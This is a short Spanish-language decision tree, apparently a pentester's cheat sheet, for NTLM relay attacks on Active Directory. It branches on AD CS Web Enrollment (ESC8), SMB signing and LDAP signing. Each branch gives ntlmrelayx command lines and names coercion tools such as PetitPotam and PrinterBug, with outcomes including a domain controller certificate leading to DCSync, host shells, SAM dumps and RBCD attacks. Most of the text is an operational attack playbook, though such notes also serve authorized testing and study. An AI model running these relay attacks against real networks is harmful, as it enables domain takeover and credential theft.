  ¿Hay AD CS con Web Enrollment HTTP expuesto?  (puerto 80 en CA, /certsrv/)
  │
  ├── SÍ ──► ESC8: relay coerce → http://CA/certsrv/
  │         ▸ ntlmrelayx --target http://CA/certsrv/certfnsh.asp --adcs --template DomainController
  │         ▸ Coerce con: PetitPotam (sin creds en 2019 unpatched, con creds después)
  │                       PrinterBug   (necesita spooler activo)
  │                       DFSCoerce    (alternativa si PetitPotam parcheado)
  │                       ShadowCoerce (otra alternativa)
  │         ▸ Te da CERTIFICADO del DC → PKINIT → DCSync. GAME OVER.
  │
  └── NO ──► ¿SMB signing deshabilitado en algún host? (mira relay_list.txt)
            │
            ├── SÍ ──► Relay SMB→SMB clásico
            │         ▸ ntlmrelayx -tf relay_list.txt -smb2support -socks
            │         ▸ Coerce contra cualquier máquina del dominio
            │         ▸ Te da shell/SAM del host destino
            │
            └── NO ──► ¿LDAP signing OFF o channel binding OFF?
                      │
                      ├── SÍ ──► Relay SMB→LDAP/LDAPS
                      │         ▸ ntlmrelayx --target ldaps://dc01 --delegate-access
                      │         ▸ Si relayeas una cuenta de máquina → RBCD attack
                      │
                      └── NO ──► Estás bloqueado para relay; busca otra vía
                                (Kerberoast, AS-REP roast, BloodHound paths, etc.)